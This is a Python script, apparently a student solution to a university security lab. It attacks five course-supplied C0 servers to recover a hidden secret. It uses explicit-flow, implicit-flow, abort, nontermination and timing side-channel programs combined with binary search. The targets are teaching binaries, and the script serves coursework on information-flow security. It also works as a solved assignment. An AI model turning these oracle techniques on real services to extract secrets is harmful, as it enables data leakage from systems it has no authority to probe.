#!/usr/bin/env python3
"""
Automate Lab 2 Part 1 attacks against c0_serve1..c0_serve5.

Run this on linux.andrew.cmu.edu where the staff binaries are available.
"""

from __future__ import annotations

import argparse
import os
import shlex
import statistics
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional

SECRET_BITS = 62
SECRET_MIN = 0
SECRET_MAX_EXCLUSIVE = 1 << SECRET_BITS


DIRECT_FLOW_PROGRAM = """int main(int input, int secret) {
  return secret;
}
"""

IMPLICIT_BOOLEAN_PROGRAM = """int main(int input, int secret) {
  int out = 0;
  if (secret < input) {
    out = 1;
  }
  return out;
}
"""

ABORT_ORACLE_PROGRAM = """int main(int input, int secret) {
  if (secret < input) {
    error("leak");
  }
  return 0;
}
"""

TERMINATION_ORACLE_PROGRAM = """int main(int input, int secret) {
  if (secret < input) {
    while (true) {
    }
  }
  return 0;
}
"""

TIMING_ORACLE_PROGRAM = """int main(int input, int secret) {
  int warmup = 0;
  while (warmup < 1000000) {
    warmup = warmup + 1;
  }
  if (secret < input) {
    int burn = 0;
    while (burn < 6000000) {
      burn = burn + 1;
    }
  }
  return 0;
}
"""


@dataclass
class QueryResult:
    kind: str
    value: Optional[int]
    elapsed_s: float
    exit_code: Optional[int]
    stdout: str
    stderr: str


class StrategyFailed(Exception):
    pass


def log(msg: str) -> None:
    print(msg, flush=True)


def parse_server_output(stdout: str) -> tuple[str, Optional[int]]:
    line = stdout.strip().splitlines()[-1].strip() if stdout.strip() else ""
    if line.startswith("success "):
        try:
            return "success", int(line.split()[1])
        except Exception:
            return "success", None
    if line.startswith("failure "):
        try:
            return "failure", int(line.split()[1])
        except Exception:
            return "failure", None
    if line in {"error", "abort", "insecure"}:
        return line, None
    if line == "":
        return "no-output", None
    return "unknown", None


def run_query(
    *,
    server_command: str,
    userid: str,
    program_path: Path,
    input_value: int,
    timeout_s: float,
) -> QueryResult:
    quoted_user = shlex.quote(userid)
    quoted_program = shlex.quote(str(program_path))
    cmd = f"{server_command} {quoted_user} {quoted_program} {input_value}"
    t0 = time.perf_counter()
    try:
        cp = subprocess.run(
            ["bash", "-lc", cmd],
            text=True,
            capture_output=True,
            timeout=timeout_s,
            check=False,
        )
        elapsed = time.perf_counter() - t0
        kind, value = parse_server_output(cp.stdout)
        return QueryResult(
            kind=kind,
            value=value,
            elapsed_s=elapsed,
            exit_code=cp.returncode,
            stdout=cp.stdout,
            stderr=cp.stderr,
        )
    except subprocess.TimeoutExpired:
        elapsed = time.perf_counter() - t0
        return QueryResult(
            kind="timeout",
            value=None,
            elapsed_s=elapsed,
            exit_code=None,
            stdout="",
            stderr="",
        )


class ProgramFile:
    def __init__(self, source: str):
        self.source = source
        self.path: Optional[Path] = None

    def __enter__(self) -> Path:
        fd, raw_path = tempfile.mkstemp(prefix="lab2_attack_", suffix=".c0")
        os.close(fd)
        self.path = Path(raw_path)
        self.path.write_text(self.source, encoding="utf-8")
        return self.path

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        if self.path is not None:
            try:
                self.path.unlink()
            except FileNotFoundError:
                pass


def binary_search_oracle(
    oracle: Callable[[int], bool],
) -> int:
    lo = SECRET_MIN
    hi = SECRET_MAX_EXCLUSIVE
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if oracle(mid):
            hi = mid
        else:
            lo = mid
    return lo


def recover_direct(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
) -> Optional[int]:
    with ProgramFile(DIRECT_FLOW_PROGRAM) as path:
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=path,
            input_value=0,
            timeout_s=timeout_s,
        )
        if res.kind == "success" and res.value is not None:
            return res.value
        return None


def recover_from_failure_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    program_source: str,
) -> Optional[int]:
    with ProgramFile(program_source) as path:
        def probe(mid: int) -> bool:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=mid,
                timeout_s=timeout_s,
            )
            if res.kind == "success" and res.value is not None:
                raise StrategyFailed(f"already solved directly: {res.value}")
            if res.kind == "failure" and res.value in (0, 1):
                return res.value == 1
            raise StrategyFailed(f"oracle unavailable: {res.kind} {res.value}")

        try:
            return binary_search_oracle(probe)
        except StrategyFailed as e:
            msg = str(e)
            if msg.startswith("already solved directly: "):
                return int(msg.split(": ", 1)[1])
            return None


def recover_from_abort_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
) -> Optional[int]:
    with ProgramFile(ABORT_ORACLE_PROGRAM) as path:
        def probe(mid: int) -> bool:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=mid,
                timeout_s=timeout_s,
            )
            if res.kind == "success" and res.value is not None:
                raise StrategyFailed(f"already solved directly: {res.value}")
            if res.kind == "abort":
                return True
            if res.kind == "failure":
                return False
            raise StrategyFailed(f"oracle unavailable: {res.kind}")

        try:
            return binary_search_oracle(probe)
        except StrategyFailed as e:
            msg = str(e)
            if msg.startswith("already solved directly: "):
                return int(msg.split(": ", 1)[1])
            return None


def recover_from_termination_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
) -> Optional[int]:
    with ProgramFile(TERMINATION_ORACLE_PROGRAM) as path:
        def probe(mid: int) -> bool:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=mid,
                timeout_s=timeout_s,
            )
            if res.kind == "success" and res.value is not None:
                raise StrategyFailed(f"already solved directly: {res.value}")
            if res.kind == "timeout":
                return True
            if res.kind == "failure":
                return False
            raise StrategyFailed(f"oracle unavailable: {res.kind}")

        try:
            return binary_search_oracle(probe)
        except StrategyFailed as e:
            msg = str(e)
            if msg.startswith("already solved directly: "):
                return int(msg.split(": ", 1)[1])
            return None


def median_runtime_for_input(
    *,
    server_command: str,
    userid: str,
    program_path: Path,
    input_value: int,
    timeout_s: float,
    repeats: int,
) -> Optional[float]:
    runtimes: list[float] = []
    for _ in range(repeats):
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=program_path,
            input_value=input_value,
            timeout_s=timeout_s,
        )
        if res.kind == "success" and res.value is not None:
            raise StrategyFailed(f"already solved directly: {res.value}")
        if res.kind != "failure":
            raise StrategyFailed(f"timing probe rejected: {res.kind}")
        runtimes.append(res.elapsed_s)
    if not runtimes:
        return None
    return statistics.median(runtimes)


def recover_from_timing_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    repeats: int,
) -> Optional[int]:
    with ProgramFile(TIMING_ORACLE_PROGRAM) as path:
        try:
            t_false = median_runtime_for_input(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=SECRET_MIN,
                timeout_s=timeout_s,
                repeats=repeats,
            )
            t_true = median_runtime_for_input(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=SECRET_MAX_EXCLUSIVE,
                timeout_s=timeout_s,
                repeats=repeats,
            )
            if t_false is None or t_true is None:
                return None
            if t_true <= t_false * 1.20:
                return None
            threshold = (t_false + t_true) / 2.0

            def probe(mid: int) -> bool:
                t_mid = median_runtime_for_input(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=mid,
                    timeout_s=timeout_s,
                    repeats=repeats,
                )
                if t_mid is None:
                    raise StrategyFailed("timing measurement failed")
                return t_mid > threshold

            return binary_search_oracle(probe)
        except StrategyFailed as e:
            msg = str(e)
            if msg.startswith("already solved directly: "):
                return int(msg.split(": ", 1)[1])
            return None


def recover_server_secret(
    *,
    server_idx: int,
    userid: str,
    timeout_s: float,
    timing_timeout_s: float,
    timing_repeats: int,
) -> Optional[int]:
    server_command = f"~mfredrik/bin/c0_serve{server_idx}"
    log(f"[serve{server_idx}] trying direct explicit flow")
    direct = recover_direct(
        server_command=server_command,
        userid=userid,
        timeout_s=timeout_s,
    )
    if direct is not None:
        return direct

    log(f"[serve{server_idx}] trying implicit-flow boolean oracle")
    implicit = recover_from_failure_oracle(
        server_command=server_command,
        userid=userid,
        timeout_s=timeout_s,
        program_source=IMPLICIT_BOOLEAN_PROGRAM,
    )
    if implicit is not None:
        return implicit

    log(f"[serve{server_idx}] trying abort oracle")
    abort_secret = recover_from_abort_oracle(
        server_command=server_command,
        userid=userid,
        timeout_s=timeout_s,
    )
    if abort_secret is not None:
        return abort_secret

    log(f"[serve{server_idx}] trying nontermination oracle")
    term_secret = recover_from_termination_oracle(
        server_command=server_command,
        userid=userid,
        timeout_s=timeout_s,
    )
    if term_secret is not None:
        return term_secret

    log(f"[serve{server_idx}] trying timing oracle")
    timing_secret = recover_from_timing_oracle(
        server_command=server_command,
        userid=userid,
        timeout_s=timing_timeout_s,
        repeats=timing_repeats,
    )
    if timing_secret is not None:
        return timing_secret

    return None


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Lab 2 Part 1 secret extractor")
    p.add_argument("--userid", required=True, help="Andrew user id")
    p.add_argument(
        "--servers",
        nargs="+",
        type=int,
        default=[1, 2, 3, 4, 5],
        help="Server indices to attack (default: 1 2 3 4 5)",
    )
    p.add_argument(
        "--outdir",
        default=".",
        help="Directory where flow_serve<n>.txt files are written",
    )
    p.add_argument(
        "--query-timeout",
        type=float,
        default=1.2,
        help="Timeout for non-timing strategies in seconds",
    )
    p.add_argument(
        "--timing-timeout",
        type=float,
        default=8.0,
        help="Timeout for timing strategy measurements in seconds",
    )
    p.add_argument(
        "--timing-repeats",
        type=int,
        default=3,
        help="Repetitions per timing measurement (median is used)",
    )
    return p.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    unresolved: list[int] = []

    for idx in args.servers:
        if idx < 1 or idx > 5:
            log(f"[serve{idx}] skipped: invalid server index")
            unresolved.append(idx)
            continue
        secret = recover_server_secret(
            server_idx=idx,
            userid=args.userid,
            timeout_s=args.query_timeout,
            timing_timeout_s=args.timing_timeout,
            timing_repeats=args.timing_repeats,
        )
        if secret is None:
            log(f"[serve{idx}] not recovered")
            unresolved.append(idx)
            continue
        outfile = outdir / f"flow_serve{idx}.txt"
        outfile.write_text(f"{secret}\n", encoding="utf-8")
        log(f"[serve{idx}] recovered {secret} -> {outfile}")

    if unresolved:
        log(
            "Unresolved servers: "
            + ", ".join(str(i) for i in unresolved)
            + ". One server may be intentionally secure."
        )
        return 2
    log("All requested servers recovered.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
